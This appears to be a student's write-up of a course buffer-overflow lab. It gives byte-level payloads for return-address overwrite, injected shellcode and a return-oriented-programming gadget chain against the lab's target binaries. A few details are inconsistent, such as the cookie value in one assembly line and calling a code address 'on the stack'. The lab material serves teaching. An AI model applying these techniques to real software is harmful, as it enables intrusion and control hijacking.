### phase 1
the aim is to redirect the function to execute `touch1()` function. we can see that `getbuf()` allocates 56 bytes of memory, and
returns a value:
```assembly
0x0000000000402601 <+0>:	sub    $0x38,%rsp
0x0000000000402605 <+4>:	mov    %rsp,%rdi
0x0000000000402608 <+7>:	call   0x4028a2 <Gets>
0x000000000040260d <+12>:	mov    $0x1,%eax
0x0000000000402612 <+17>:	add    $0x38,%rsp
0x0000000000402616 <+21>:	ret
```
so we can provide 56 bytes of padding followed by the beginning address of `touch1()`.
```assembly
0000000000402617 <touch1>:
  402617:	50                   	push   %rax
  402618:	58                   	pop    %rax
  402619:	48 83 ec 08          	sub    $0x8,%rsp
  40261d:	c7 05 15 22 11 00 01 	movl   $0x1,0x112215(%rip)
  # ......
```
`0x402617` is where the `touch1()` function lives on the stack. so we need to create a text file with $8\*7$ bytes of padding,
then the little endian address of `touch1()`:
```
/* 56 bytes padding */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* touch1 little endian addr */
17 26 40 00 00 00 00 00
```

### phase 2
the aim of this phase is to execute code in `touch2()`, but under the condition our cookie is passed to the function. we can crate a
small assembly instruction to move our cookie into `%rdi` register (first argument), and return:
```assembly
mov $0x76EBDB65, %rdi
ret
```

then use GCC to create an object file we can disassemble:
```shell
cc -c ctarget.l2.s
objdump -d ctarget.l2.o
0000000000000000 <.text>:
   0:	48 c7 c7 56 db eb 76 	mov    $0x76ebdb56,%rdi
   7:	c3                   	ret
```
the hexadecimal byte representation of our assembly instructions is `48 C7 C7 56 DB EB 76 C3`.\
now executing the `getbuf()` function in `ctarget`, we're prompted to enter a string, which should be longer than the buffer
allocated for the function (56 bytes):
```
>>> x/s $rsp
0x5561a060:	"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz"
>>> x/x touch2
0x00402647 <touch2>:	0x50
```
above is the address of the stack pointer (`0x5561A060`) and the beginning of `touch2()` function (`0x00402647`). these will be used
to transfer control to `touch2()` by incrementing the stack pointer and executing the address where `touch2()` begins:
```
/* asm instruction */
48 C7 C7 56 DB EB 76 C3
/* remaining 48 bytes padding */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* %rsp little endian addr */
60 A0 61 55 00 00 00 00
/* touch2 little endian addr */
47 26 40 00 00 00 00 00
```

### phase 3
the objective of this phase is to pass our cookie as **a string** to `touch3()` function, which means pushing it onto the stack in
`%rdi` register like previous phases. however, the instructions note that functions `hexmatch()` and `strncmp()` also push data onto 
the stack, meaning our cookie must be pushed *after* those functions are called.

first step is to find where to store our cookie — recall our buffer is 56 bytes, `hexmatch()` and `strncmp()` will both allocate 8
bytes on the stack, so $56 + 8 + 8 = 72$.\
this means we must add 72 bytes on top of `%rsp` (use address from phase 2) — $5561A060_{16} + 48_{16} = 5561A0A8_{16}$. this is the
new address used in our assembly snippet to increment the stack pointer:
```assembly
mov $0x5561A0A8, %rdi
ret
```

compile and dump the contents of the object file like before. this is the first thing that will be in solution file, followed by the
remaining necessary padding, then the address of `touch3()` to "initialise" the fucntion, then our cookie (converted to a hexadecimal
string) which is passed as an argument to `touch3()`:
```
/* asm instruction */
48 C7 C7 A8 A0 61 55 C3
/* remaining 48 bytes padding */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* %rsp little endian addr */
60 A0 61 55 00 00 00 00
/* touch3 little endian addr */
5C 27 40 00 00 00 00 00
/* cookie as hex string */
37 36 65 62 64 62 35 36
```

### phase 4
the aim of this phase is move our cookie into `%rdi`, then call `touch2()`, just like phase 2, except with address randomisation.
[gadgets](solutions/misc/farm.s) exist that we can use to execute instructions using their hexadecimal representation.

first we need to pop `%rax` off the stack, which corresponds to `0x58`, so we must find a matching instruction:
```
<addval_241>:
  402832:	8d 87 58 89 c7 c3    	lea    -0x3c3876a8(%rdi),%eax
  402838:	c3                   	ret
```
above, the instruction starts at `0x402832`, and `0x58` is offset by 2 bytes, so the address that'll jump directly to the pop
instruction is `0x402834`.

next we need the instruction to `mov %rax, %rdi` and return, which is represented by `48 89 C7 C3`:
```
<getval_350>:
  402853:	b8 48 89 c7 c3       	mov    $0xc3c78948,%eax
  402858:	c3                   	ret
```
this instruction starts at `0x402853`, but the string we're looking for is offset by 1 byte, so add that to the starting address: 
`0x402854`.\
lastly, we just need to call `touch2()` with its entry address like before.

```
/* 56 bytes padding */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
/* pop %rax off stack */
34 28 40 00 00 00 00 00
/* cookie (little endian) */
56 DB EB 76 00 00 00 00
/* mov %rax, %rdi and ret */
54 28 40 00 00 00 00 00
/* touch2 little endian addr */
47 26 40 00 00 00 00 00
```

### misc
**hex2raw usage**
```shell
./hex2raw < *target.l*.txt > *target.l*.bin
```

**target binary usage**
```shell
./ctarget < ctarget.l*.bin
./rtarget < rtarget.l*.bin
```

**test script usage**
```shell
./test.sh [c r] [1 2 3]
```
